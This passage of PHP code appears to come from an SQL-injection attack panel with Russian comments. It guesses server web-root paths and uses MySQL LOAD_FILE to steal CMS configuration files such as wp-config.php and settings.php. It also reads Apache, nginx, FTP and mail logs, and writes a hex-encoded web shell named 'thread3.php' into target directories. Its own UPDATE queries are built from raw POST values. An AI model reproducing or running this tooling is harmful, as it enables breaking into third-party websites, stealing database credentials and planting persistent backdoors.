        $path2[] = "/space/home/clients/websites/w_80200/{$domen2}/public_html/";
		$path2[] = "/var/www/virtual_client/ridel-holding/www/";
		$path2[] = "/var/www/hq/data/www/{$domen}/";
        $path2[] = "/var/www/hq/data/www/{$domen2}/";
		$path2[] = "/var/www/vhosts/{$domen}/httpdocs/";
        $path2[] = "/var/www/vhosts/{$domen2}/httpdocs/";
		$path2[] = "/home/admin/data/www/{$domen}/";
        $path2[] = "/home/admin/data/www/{$domen2}/";
		$path2[] = "/usr/local/www/apache22/data/{$domen}/";
        $path2[] = "/usr/local/www/apache22/data/{$domen2}/";
		$path2[] = "/usr/local/www/lib/";
		$path2[] = "/home/users/domains/{$domen}/";
        $path2[] = "/home/users/domains/{$domen2}/";
		$path2[] = "/var/www/html/hosts/{$domen}/cgi-bin/";
        $path2[] = "/var/www/html/hosts/{$domen2}/cgi-bin/";
		$path2[] = "/var/www/vhosts/{$domen}/httpdocs/";
        $path2[] = "/var/www/vhosts/{$domen2}/httpdocs/";
		$path2[] = "/home/users/user/domains/{$domen}/";
        $path2[] = "/home/users/user/domains/{$domen2}/";
		$path2[] = "/srv/www/{$domen}/";
        $path2[] = "/srv/www/{$domen2}/";
		$path2[] = "/{$domen}/";
        $path2[] = "/{$domen2}/";
		$path2[] = "/var/www/html/domain/{$domen}/";
		$path2[] = "/usr/home/{$domen}/htdocs/";
		$path2[] = "/home/{$domen}/domains/{$domen}/public_html/";
		$path2[] = "/usr/home/www/{$domen}/htdocs/";
		$path2[] = "/www/vhosts/{$domen}/html/";
		$path2[] = "/home/{$domen}/public_html/";
		$path2[] = "/var/www/virtual_client/burdin/www/";
		$path2[] = "/home/opt/{$domen}/www/forum/html/";
		$path2[] = "/var/www/admin/data/www/{$domen}/";
		$path2[] = "usr/local/zend/apache2/htdocs/";
		$path2[] = "usr/local/zend/apache2/{$domen}/";
        
        $path2[] = "/var/www/html/domain/{$domen2}/";
		$path2[] = "/usr/home/{$domen2}/htdocs/";
		$path2[] = "/home/{$domen}/domains/{$domen2}/public_html/";
		$path2[] = "/usr/home/www/{$domen2}/htdocs/";
		$path2[] = "/www/vhosts/{$domen2}/html/";
		$path2[] = "/home/{$domen2}/public_html/";
		$path2[] = "/var/www/virtual_client/burdin/www/";
		$path2[] = "/home/opt/{$domen2}/www/forum/html/";
		$path2[] = "/var/www/admin/data/www/{$domen2}/";
		$path2[] = "usr/local/zend/apache2/htdocs/";
		$path2[] = "usr/local/zend/apache2/{$domen2}/";
			
			$load_passwd = $this->mysqlInj->load_passwd();
			$this->d($load_passwd,'load_passwd');
			
			
			foreach($load_passwd as $load_passwd_one)
			{
				$load_passwd_new[] = $load_passwd_one."/";
				foreach($path2 as $path_one)
				{
					$path_new[] = $load_passwd_one.$path_one;
					
				}
			}
			
			$path_new2 = array_merge($path_new,$load_passwd_new);
			
			$this->d($path_new2,'$path_new2');
			
		}
		
		$conf[] = "fig.php";
		$conf[] = "admin/db_fns.php";
		$conf[] = "wp-config.php";
		$conf[] = "configuration.php";
		$conf[] = "engine/data/dbconfig.php";
		$conf[] = "sites/default/settings.php";
		$conf[] = "config.php";
		$conf[] = "app/etc/local.xml";
		$conf[] = "config.local.php";
		$conf[] = "manager/includes/config.inc.php";
		$conf[] = "typo3conf/localconf.php";
		$conf[] = "vars.inc.php";
		$conf[] = "application/config/config.php";
		$conf[] = "bitrix/php_interface/dbconn.php";
		$conf[] = "kernel/wbs.xml";
		$conf[] = "config/settings.inc.php";
		$conf[] = "cfg/connect.inc.php";
		$conf[] = "phpshop/inc/config.ini";
		$conf[] = "system/data/db.php";
		$conf[] = "core/config/config.inc.php";
		$conf[] = "protected/config/main.php";
		$conf[] = "includes/vars.php";
		$conf[] = "USER/CONFIG.AP";
		$conf[] = "adm/config.php";
		$conf[] = "admin/config.php";
		$conf[] = "administrator/config.php";
		$conf[] = "cgi-bin/statusconfig.pl";
		$conf[] = "class/fckeditor/fckconfig.js";
		$conf[] = "config/config.txt";
		$conf[] = "config.inc";
		$conf[] = "config.php";
		$conf[] = "config.txt";
		$conf[] = "inc/config.inc";
		$conf[] = "inc/config.php";
		$conf[] = "inc/config.inc";
		$conf[] = "inludes/config.php";
		$conf[] = "inludes/config.inc";
		$conf[] = "inludes/config.inc";
		$conf[] = "inlude/config.php";
		$conf[] = "inlude/config.inc";
		$conf[] = "inlude/config.inc";
		$conf[] = "inludes/conf.php";
		$conf[] = "inludes/conf.inc";
		$conf[] = "inludes/conf.inc";
		$conf[] = "FCKeditor/fckconfig.js";
		$conf[] = "forums//adm/config.php";
		$conf[] = "forums//admin/config.php";
		$conf[] = "forums//administrator/config.php";
		$conf[] = "forums/config.php";
		$conf[] = "inc/config.php";
		$conf[] = "inc/fckeditor/fckconfig.js";
		$conf[] = "config.conf";
		$conf[] = "modules/fckeditor/fckeditor/fckconfig.js";
		$conf[] = "myinvoicer/config.inc";
		$conf[] = "pt_config.inc";
		$conf[] = "Script/fckeditor/fckconfig.js";
		$conf[] = "servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml";
		$conf[] = "shop/php_files/site.config.php+";
		$conf[] = "sites/all/libraries/fckeditor/fckconfig.js";
		$conf[] = "sites/all/modules/fckeditor/fckeditor/fckconfig.js";
		$conf[] = "soapConfig.xml";
		$conf[] = "soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml";
		$conf[] = "stconfig.nsf";
		$conf[] = "XSQLConfig.xml";
		$conf[] = "sql.config";
		$conf[] = "sql.inf";

		//$this->d($path,'$path');
		//exit;
		
		
		//exit;
		
		

		if(count($path_new) >0)
		{
			

			$i=1;
			foreach($path_new as $conf_new2)
			{
				
				$new = time();
				$razn = $new-$time_all;
			
				//стопаем перебор если слишком долго идет
				if($razn>$time2){$this->d('TIME!!!! ALL');break;}

				
				foreach($conf as $conf_one)
				{
					
					$new = time();
					$razn = $new-$time_all;
			
					//стопаем перебор если слишком долго идет
					if($razn>$time2){$this->d('TIME!!!! ALL');break;}
					
					$file = $conf_one;	
					$load_f_conf = $this->mysqlInj->load_file($conf_new2.$conf_one);
					
					//$this->d($conf_new2.$conf_one);
					
                    
                    $this->d($load_f_conf,$load_f_conf["LOAD_FILE('$conf_new2.$conf_one')"]);
                   // exit;
                    
					if($load_f_conf["LOAD_FILE('$conf_new2.$conf_one')"] !='')
					{
						
						
						
						///
						
						//$this->d($load_f_conf,"$load_f_conf");	
						
						//$path = str_replace("index.php",'',$url);
						
						$this->d($conf_new2.$conf_one,'$conf_new2.$conf_one');
						
						mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}", 0777);
						
						$file = "conf{$i}.txt";
						$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/".$file;
						
						echo "<a  href='/shells/{$domen}/$file' target='_blank'>{$file}</a>";
						
						file_put_contents($ff,$load_f_conf);
						

						
						
						$data2['path_conf{$i}'][]=$conf_new2.$conf_one;
						$data['path_conf'] = $data2;
						
						$path_conf = $conf_new2.$conf_one;
						
						
						$this->Session->write('inject',$data);
						
						
						
						//$this->Filed->query("UPDATE  `posts_one` SET  `path_conf{$i}` =  '$path_conf' WHERE  `domen` ='$domen'");
						
						//$this->d("UPDATE  `posts_one` SET  `path_conf{$i}` =  '$path_conf' WHERE  `domen` ='$domen'");

						$i++;
						
						
					}
					
				}
				
				
				
			}
			
		}
		
		
		
		
		
		
		//$this->Session->write('inject',$data);
		//$this->set('data',$data);		
		//$this->render('orderone');
		die();	

		
	}
	
	function search_httpd($id){
		
		
		
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		unset($data['orders']);
		
		
		//$this->Session->write('inject',$data);
		
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		$domen = $squle['Post']['domen'];
		

		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	

		$card='';
		$i=1;
		
		$this->d($pass);
		
		$this->tableOrder='';
		
		
		$post_id = $data['posts_one']['id'];
		
		
		$this->workup();
		
		
		$path[] = "/usr/local/apache2/conf/extra/httpd-vhosts.conf";
		$path[] = "/usr/local/apache/conf/httpd.conf/";
		$path[] = "/usr/local/apache2/conf/httpd.conf";
		$path[] = "/usr/local/apache/httpd.conf";
		$path[] = "/usr/local/apache2/httpd.conf";
		$path[] = "/usr/local/httpd/conf/httpd.conf";
		$path[] = "/usr/local/etc/apache/conf/httpd.conf";
		$path[] = "/usr/local/etc/apache2/conf/httpd.conf";
		$path[] = "/usr/local/etc/httpd/conf/httpd.conf";
		$path[] = "/usr/apache2/conf/httpd.conf";
		$path[] = "/usr/apache/conf/httpd.conf";
		$path[] = "/usr/local/apps/apache2/conf/httpd.conf";
		$path[] = "/usr/local/apps/apache/conf/httpd.conf";
		$path[] = "/etc/apache/conf/httpd.conf";
		$path[] = "/etc/apache2/conf/httpd.conf";
		$path[] = "/etc/httpd/conf/httpd.conf";
		$path[] = "/etc/http/conf/httpd.conf";
		$path[] = "/etc/apache2/httpd.conf";
		$path[] = "/etc/httpd/httpd.conf";
		$path[] = "/etc/http/httpd.conf";
		$path[] = "/etc/httpd.conf";
		$path[] = "/opt/apache/conf/httpd.conf";
		$path[] = "/opt/apache2/conf/httpd.conf";
		$path[] = "/var/www/conf/httpd.conf";
		$path[] = "/conf/httpd.conf";
		$path[] = "/var/www/conf/httpd.conf";
		$path[] = "/etc/httpd/conf/extra/httpd-vhosts.conf";
		$path[] = "/etc/apache/conf/extra/httpd-vhosts.conf";
		$path[] = "/etc/apache2/conf/extra/httpd-vhosts.conf";
		$path[] = "/etc/httpd/conf.d/vhosts.conf";
		$path[] = "/etc/apache/conf.d/vhosts.conf";
		$path[] = "/etc/apache2/conf.d/vhosts.conf";
		$path[] = "/var/www/vhosts/{$domen}";
		$path[] = "/etc/httpd/vhost.d/{$domen}";
		$path[] = "/etc/apache/vhost.d/{$domen}";
		$path[] = "/etc/apache2/vhost.d/{$domen}";
		$path[] = "/opt/lampp/etc/extra/httpd-vhosts.conf";
		$path[] = "/usr/local/zend/etc/sites.d/zend-default-vhost-80.conf";
		$path[] = "/usr/local/zend/etc/httpd.conf";
		$path[] = "/etc/httpd/conf.d/postfixadmin.conf";
		$path[] = "/etc/httpd/conf.d/postfixadmin.conf";
		$path[] = "/var/www/html/postfixadmin/config.inc.php";
		$path[] = "/etc/httpd/conf.d/subversion.conf";
		$path[] = "/etc/httpd/conf.d/phpMyAdmin.conf";
		$path[] = "/etc/apache2/default-server.conf";
		$path[] = "/etc/apache/default-server.conf";
		$path[] = "/usr/local/apps/apache2/conf/httpd.conf";
		$path[] = "/usr/local/apps/apache/conf/httpd.conf";
		$path[] = "/opt/apache/conf/extra/httpd-vhosts.conf";
		$path[] = "/opt/apache/conf/extra/httpd-default.conf";
		$path[] = "/opt/apache2/conf/extra/httpd-vhosts.conf";
		$path[] = "/opt/apache2/conf/extra/httpd-default.conf";
		$path[] = "/private/etc/httpd/httpd.conf";
		$path[] = "/private/etc/httpd/httpd.conf.default";
		$path[] = "/usr/local/php/httpd.conf.php";
		$path[] = "/usr/local/php4/httpd.conf.php";
		$path[] = "/usr/local/php5/httpd.conf.php";
		$path[] = "/usr/local/php/httpd.conf";
		$path[] = "/usr/local/php4/httpd.conf";
		$path[] = "/usr/local/php5/httpd.conf";
		$path[] = "/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf";
		$path[] = "/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf";
		$path[] = "/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf";
		$path[] = "/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php";
		$path[] = "/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php";
		$path[] = "/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php";
		$path[] = "/usr/local/etc/apache/vhosts.conf";
		$path[] = "/usr/local/etc/apache2/vhosts.conf";
		$path[] = "/usr/local/apache/conf/vhosts.conf";
		$path[] = "/usr/local/apache2/conf/vhosts.conf";
		$path[] = "/usr/local/apache/conf/vhosts-custom.conf";
		$path[] = "/usr/local/apache2/conf/vhosts-custom.conf";
		$path[] = "/usr/local/apache/conf/modsec.conf";
		$path[] = "/etc/nginx/nginx.conf";
		$path[] = "/usr/local/etc/nginx/nginx.conf";
		$path[] = "/usr/local/nginx/conf/nginx.conf";
		$path[] = "/etc/apache2/sites-available/default";
		$path[] = "/etc/apache2/sites-available/default-ssl";
		$path[] = "/etc/apache2/apache2.conf";
		$path[] = "/etc/apache2/httpd.conf";
		$path[] = "/etc/apache2/ports.conf";
		$path[] = "/etc/apache2/sites-enabled/000-default";
		$path[] = "/etc/apache2/sites-enabled/default";
		
		$this->d($path,'$path');
		//exit;
		
		
		
		

		
		foreach($path as $conf_new2)
		{
			
			$load_f_new = $this->mysqlInj->load_file($conf_new2);
			
			if($load_f_new !='')
			{
				$this->d($load_f_new,"$conf_new2");	
				//return true;
				$kk = 'yes';
				
			}
			
			
		}
		
		if($kk !='yes'){
			$this->d('httpd не нашел');
			
		}
		
		
		
		
		
		
		//$this->Session->write('inject',$data);
		//$this->set('data',$data);		
		//$this->render('orderone');
		die();	

		
	}
	
	function search_logs($id){
		
		
		
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		unset($data['orders']);
		
		
		//$this->Session->write('inject',$data);
		
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		$domen = $squle['Post']['domen'];
		

		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	

		$card='';
		$i=1;
		
		$this->d($pass);
		
		$this->tableOrder='';
		
		
		$post_id = $data['posts_one']['id'];
		
		
		$this->workup();
		

		
		$path[] = "/var/log/error_log";
		$path[] = "/var/log/access_log";
		$path[] = "/var/log/apache/error.log";
		$path[] = "/var/log/apache/error_log";
		$path[] = "/usr/local/apache/logs/error.log";
		$path[] = "/usr/local/apache/logs/error_log";
		
		$path[] = "/var/log/apache2/error.log";
		$path[] = "/var/log/apache2/error_log";
		$path[] = "/usr/local/apache2/logs/error.log";
		$path[] = "/usr/local/apache2/logs/error_log";
		
		$path[] = "/var/www/logs/error.log";
		$path[] = "/var/www/logs/error_log";
		$path[] = "/var/log/access_log";
		$path[] = "/var/log/apache/access.log";
		$path[] = "/var/www/logs/access.log";
		$path[] = "/usr/local/apache/logs/access.log";
		$path[] = "/var/www/logs/access_log";
		$path[] = "/etc/httpd/logs/error.log";
		$path[] = "/etc/httpd/logs/error_log";
		$path[] = "/etc/httpd/logs/acces.log";
		$path[] = "/etc/httpd/logs/acces_log";
		$path[] = "/var/log/httpd/access_log";

		$path[] = "/var/www/vhosts/logs/error_log";
		$path[] = "/etc/httpd/vhost.d/logs/error_log";
		$path[] = "/etc/apache/vhost.d/logs/error_log";
		$path[] = "/etc/apache2/vhost.d/logs/error_log";
		
		$path[] = "/var/www/vhosts/logs/error.log";
		$path[] = "/etc/httpd/vhost.d/logs/error.log";
		$path[] = "/etc/apache/vhost.d/logs/error.log";
		$path[] = "/etc/apache2/vhost.d/logs/error.log";
		
		$path[] = "/var/www/vhosts/logs/access_log";
		$path[] = "/etc/httpd/vhost.d/logs/access_log";
		$path[] = "/etc/apache/vhost.d/logs/access_log";
		$path[] = "/etc/apache2/vhost.d/logs/access_log";
	
		$path[] = "/opt/lampp/logs/access_log";
		$path[] = "/opt/lampp/logs/error_log";
		$path[] = "/opt/lampp/logs/access.log";
		$path[] = "/opt/lampp/logs/error.log";
		$path[] = "/opt/xampp/logs/access_log";
		$path[] = "/opt/xampp/logs/error_log";
		$path[] = "/opt/xampp/logs/access.log";
		$path[] = "/opt/xampp/logs/error.log";
		$path[] = "/usr/local/cpanel/logs";
		$path[] = "/usr/local/cpanel/logs/stats_log";
		$path[] = "/usr/local/cpanel/logs/access_log";
		$path[] = "/usr/local/cpanel/logs/error_log";
		$path[] = "/usr/local/cpanel/logs/license_log";
		$path[] = "/usr/local/cpanel/logs/login_log";
		$path[] = "/usr/local/cpanel/logs/stats_log";
		$path[] = "/var/log/mysql/mysql-bin.log";
		$path[] = "/var/log/mysql.log";
		$path[] = "/var/log/mysqlderror.log";
		$path[] = "/var/log/mysql/mysql.log";
		$path[] = "/var/log/mysql/mysql-slow.log";
		$path[] = "/etc/firewall.conf";
		$path[] = "/var/mysql.log";
		$path[] = "/var/log/exim_mainlog";
		$path[] = "/var/log/exim/mainlog";
		$path[] = "/var/log/maillog";
		$path[] = "/var/log/exim_paniclog";
		$path[] = "/var/log/exim/paniclog";
		$path[] = "/var/log/exim/rejectlog";
		$path[] = "/var/log/exim_rejectlog";
		$path[] = "/var/log/pure-ftpd/pure-ftpd.log";
		$path[] = "/logs/pure-ftpd.log";
		$path[] = "/var/log/pureftpd.log";
		$path[] = "/var/log/ftp-proxy/ftp-proxy.log";
		$path[] = "/var/log/vsftpd.log";
		$path[] = "/etc/logrotate.d/vsftpd.log";
		$path[] = "/var/log/xferlog";
		$path[] = "/var/adm/log/xferlog";
		$path[] = "/var/log/ftplog";
		
		






		
		
		$this->d($path,'$path');
		//exit;
		
		
		
		

		
		foreach($path as $conf_new2)
		{
			
			$load_f_new = $this->mysqlInj->load_file($conf_new2);
			
			if($load_f_new !='')
			{
				$this->d($load_f_new,"$conf_new2");	
				//return true;
				$kk = 'yes';
				
			}
			
			
		}
		
		if($kk !='yes'){
			$this->d('httpd не нашел');
			
		}
		
		
		
		
		
		
		//$this->Session->write('inject',$data);
		//$this->set('data',$data);		
		//$this->render('orderone');
		die();	

		
	}
	
	
	
	
	function file_path1(){//указать путь вручную
		
		$this->d($_POST);
		$domen = $_POST['domen'];
		$path2 = $_POST['file_path1'];
		$path2 = trim($path2);
		
		$kk = explode(";",$path2);
		$path = $kk[0];
		
		if(isset($kk[1]))
		{
			$site = $kk[1];
			
		}else{
			
			$site = $domen;
		}
		
		
		$sl = substr($path, -1);
		$this->d($sl,'sl');

		if($sl =='/'){
			$path_new = $path;
		}else{
			$path_new = $path.'/';
		}
			
			
		if($path2 == '0')
		{
			$path_new = 0;
			$site = 0;	
		}
		
		if($this->Filed->query("UPDATE  `posts_one` SET  `path1` =  '$path_new',`site1` = '$site' WHERE  `domen` ='$domen'")){
			
			$this->d($path_new,"UPDATE  `posts_one` SET  `path1` =  '$path_new',`site1` = '$site' WHERE  `domen` ='$domen'");
			
		}
		
	}
	
	function file_path2(){//указать путь вручную
		
		$this->d($_POST);
		$domen = $_POST['domen'];
		$path2 = $_POST['file_path2'];
		$path2 = trim($path2);
		
		$kk = explode(";",$path2);
		$path = $kk[0];
		
		if(isset($kk[1]))
		{
			$site = $kk[1];
			
		}else{
			
			$site = $domen;
		}
		
		
		$sl = substr($path, -1);
		$this->d($sl,'sl');

		if($sl =='/'){
			$path_new = $path;
		}else{
			$path_new = $path.'/';
		}
			
			
		if($path2 == '0')
		{
			$path_new = 0;
			$site = 0;	
		}
		
		if($this->Filed->query("UPDATE  `posts_one` SET  `path2` =  '$path_new',`site2` = '$site' WHERE  `domen` ='$domen'")){
			
			$this->d($path_new,"UPDATE  `posts_one` SET  `path2` =  '$path_new',`site2` = '$site' WHERE  `domen` ='$domen'");
			
		}
		
	}
	
	function file_path3(){//указать путь вручную
		
		$this->d($_POST);
		$domen = $_POST['domen'];
		$path2 = $_POST['file_path3'];
		$path2 = trim($path2);
		
		$kk = explode(";",$path2);
		$path = $kk[0];
		
		if(isset($kk[1]))
		{
			$site = $kk[1];
			
		}else{
			
			$site = $domen;
		}
		
		
		$sl = substr($path, -1);
		$this->d($sl,'sl');

		if($sl =='/'){
			$path_new = $path;
		}else{
			$path_new = $path.'/';
		}
			
			
		if($path2 == '0')
		{
			$path_new = 0;
			$site = 0;	
		}
		
		if($this->Filed->query("UPDATE  `posts_one` SET  `path3` =  '$path_new',`site3` = '$site' WHERE  `domen` ='$domen'")){
			
			$this->d($path_new,"UPDATE  `posts_one` SET  `path3` =  '$path_new',`site3` = '$site' WHERE  `domen` ='$domen'");
			
		}
		
	}
	
	function file_path_read(){//прочитать файл
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		//unset($data['orders']);
		
		
        
        //$this->d($data,'$data');
        
		//$this->Session->write('inject',$data);
		
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		$domen = $squle['Post']['domen'];
		

		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	

		$card='';
		$i=1;
		
		
		
		$this->tableOrder='';
		
		
		$post_id = $data['posts_one']['id'];
		//$this->d($_POST,'post');
		
		$path = $_POST['file_path'];
		
		$out = $this->mysqlInj ->load_file($path);
       
         $out2 = array_keys($out);
                                    
								
        
       file_put_contents('./load_file!!!.txt',$out[$out2[0]]);
        
        
		header("Content-type: text/txt");
        
		

		print_r($out);
		

		
		 

		die();
	}
	
	function file_cookies(){//прочитать файл
		
		//$this->d($_POST);
		$domen = $_POST['domen'];
		$path2 = $_POST['file_cookies'];
		$path2 = trim($path2);
		
	
		
		
		if($this->Filed->query("UPDATE  `posts_one` SET  `cookies` =  '$path2' WHERE  `domen` ='$domen'")){
			
			$this->d($path2,"  OK UPDATE  `posts_one` SET  `cookie` =  '$path2' WHERE  `domen` ='$domen'");
			$this->d('Нажмите обновить на странице, чтобы увидеть изменения');
			
		}
		

		die();
	}
	
	function file_potok(){//прочитать файл
		
		//$this->d($_POST);
		$domen = $_POST['domen'];
		$path2 = $_POST['file_potok'];
		$path2 = trim($path2);
		
	
		$this->d("UPDATE  `settings` SET  `name` = '$path2' where `name`='potok'");
		
		if($this->Filed->query("UPDATE  `settings` SET  `value` = '$path2' where `name`='potok'")){
			
			
			
			$this->d('Нажмите обновить на странице, чтобы увидеть изменения');
			
		}
		

		die();
	}
	
	
	 

	
	////////////ЗАЛИВКА ШЕЛЛА//////////////////
	
	function sqliShell($id){
		$file = $this->Post->query("SELECT count(*) as count FROM `posts` WHERE `file_priv`=1 limit 1");
		
		
		

		if(intval($file[0][0]['count'])!==0)
		{		
			//$this->timeStart = $this->start('stepOne',1);
		}else
		{
			//die('TimeStart');
		}

		$this->d($file[0][0]['count'],'count file_priv');	
		
		
		$file_priv = $this->Post->query("SELECT * FROM `posts` WHERE `file_priv`=1 limit 1");
		
		
		foreach ($file_priv as $squle)
		{
			$this->d($squle,'sqlule');
			
			
			$fieldcount = $this->Post->query("SELECT * FROM  `fileds` WHERE  `post_id` =".$squle['posts']['id']);
			
			$squle['Post'] = $squle['posts'];
			
			if(strlen($squle['Post']['sleep']) > 2)
			{
				$set = $squle['Post']['sleep'];
				$this->d($set,'set');
			}else
			{
				$set = false;
			}
			
			
			
			$this->mysqlInj = new $this->Injector();
			
			
			$this->mysqlInj ->inject($squle['Post']['header'].'::'.$squle['Post']['gurl'],$squle,$set);
			

			//$this->d($this->mysqlInj,'$this->mysqlInj');
			
			
			//$data = $this->mysqlInj->mysqlGetAllValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%mail%').') AND ( `DATA_TYPE`=char('.$this->charcher('char').') OR `DATA_TYPE`=char('.$this->charcher('varchar').') OR `DATA_TYPE`=char('.$this->charcher('text').'))');
			
			$data = $this->mysqlInj->mysqlGetValue('mysql','user','file_priv');
			
			$this->d($data,'data');
			exit;		
			
		}
		
		
		
	}
	
	function upload_shell($name,$num){
		
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		unset($data['orders']);
		
		
		//$this->Session->write('inject',$data);
		
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		
		
		if($squle['Post']['site1'] !='' AND $squle['Post']['site1'] !='0' AND $num==1)
		{
			$domen =$squle['Post']['site1'];
			
		}elseif($squle['Post']['site2'] !='' AND $squle['Post']['site2'] !='0' AND $num==2)
		{
			$domen =$squle['Post']['site2'];
			
		}elseif($squle['Post']['site3'] !='' AND $squle['Post']['site3'] !='0' AND $num==3)
		{
			$domen =$squle['Post']['site3'];
			
		}else
		{
			$domen = $squle['Post']['domen'];
		}
		
		$this->domen = $domen;
		
		if($squle['Post']['path1'] !='' AND $squle['Post']['path1'] !='0' AND $num==1)
		{
			$this->path[] =$squle['Post']['path1'] ;
		}elseif($squle['Post']['path2'] !='' AND $squle['Post']['path2'] !='0' AND $num==2)
		{
			$this->path[] =$squle['Post']['path2'] ;
		}elseif($squle['Post']['path3'] !='' AND $squle['Post']['path3'] !='0' AND $num==3)
		{
			$this->path[] =$squle['Post']['path3'] ;
		}
		
		
		$this->d($num,'num');
		$this->d($domen,'domen');
		$this->d($this->path,'path');
		//exit;
		
		
		$this->d('SHAG 1 - find path');
		
		if(count($this->path)==0)
		{
			
			$this->d('запускаем поиск путей на автомате');
			$this->search_path();
			$this->path = array_unique($this->path);
			
		}
		
		
		if(count($this->path)==0)
		{
			$this->d('Не могу найти пути, укажите вручную');	
			die();
		}else
		{
			$this->d($this->path,'найденные пути');
		}
		
		$this->d('SHAG 2 - find dirs');
		
		
		
		
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}");
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/dirs.txt";
		
		
		
		
		if(filesize($ff) < 2)
		{
			$this->d('finddirs начинаем искать директории');
			$this->finddirs($domen);
			if(file_get_contents($ff)=='bad'){
				$this->default_dirs = true;
				$dirs = file($_SERVER['DOCUMENT_ROOT']."/app/webroot/DEFAULT_DIRS");
			}else{
				$dirs = file($ff);
				
			}
		}else
		{	
	
			if(file_get_contents($ff)=='bad'){
				
				$dirs = file($_SERVER['DOCUMENT_ROOT']."/app/webroot/DEFAULT_DIRS");
			}else{
				$dirs = file($ff);
				
			}
			
		}
		
		//$this->d($dirs,'директории у '.$domen);
		//exit;
		
		
		if(file_get_contents($ff)=='bad')
		{
			$this->default_dirs = true;		
		}
		
		foreach($dirs as $dir_one)
		{
			if($dir_one !='')
			{
				$dirs_clean[] = str_replace("http://".$domen."/",'',$dir_one);
			}
		}
		
		if(count($dirs_clean)==0)
		{
			
			$dirs_clean = file($_SERVER['DOCUMENT_ROOT']."/app/webroot/DEFAULT_DIRS");
			
		}
		
		
		$this->d($dirs_clean,'dirs_clean '.$domen);
		//exit;
		
		
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		
		
		
		foreach($this->path as $path_one)
		{
			$path_one = trim($path_one);
			
			foreach($dirs_clean as $dirs_clean_one)
			{
				$dirs_clean_one = trim($dirs_clean_one);
				
				$path_full[$dirs_clean_one] = $path_one.$dirs_clean_one;
				
			}
		}
		
		 
		$this->d($path_full,' path_full '.$domen);
		//exit;
		
		$i=0;
		
				
		//подготовленные для брута с каталогами уже
		foreach($path_full as $one => $dir)
		{
			$dir = trim($dir);
			$one = trim($one);
			
			$code = file_get_contents('upload_shell.txt');
			
			$code = $this->mysqlInj->strtohex($code);
			$code = trim($code);
			
			$path_file = $dir.'thread3.php';
			$path_url = $domen.'/'.$one.'thread3.php';
			
			
			$this->mysqlInj->upload_file($code,$path_file);
			
			
			$this->d($path_file,'$path_file');
			$this->d($path_url, '$path_url');
			$this->d($this->mysqlInj->file, '$this->mysqlInj->file');
			
			exit;
			
			
			
				
			if(preg_match("/Errcode: 2/i",$this->mysqlInj->file)){
				
				$errcode2[] = $path_file;
			}
			
			if(preg_match("/Errcode: 13/i",$this->mysqlInj->file)){
				
				$errcode13[] = $path_file;
			}
			
			if(preg_match("/already exists/i",$this->mysqlInj->file)){
				
				$this->d('already exists');
				
				$path_file = $dir.'_thread.php';
				$path_url = $domen.'/'.$one.'_thread.php';
				
				$this->mysqlInj->upload_file($code,$path_file);
				
			}
			
			
			if($this->default_dirs == true)
			{
				$chek = $this->findfile2($path_url);	
			}else{
				
				$chek = $this->findfile($path_url);	
			}
			
			
			if($this->shell_url !='')
			{
				$this->d($this->shell_url,'shell залит GOOD');
				break;
				
			}
			
			$i++;if($i==50){break;}
			
			
			
		}
		
		$this->d($errcode2,'$errcode2');
		
		$this->d($errcode13,'$errcode13');
		

		
	}
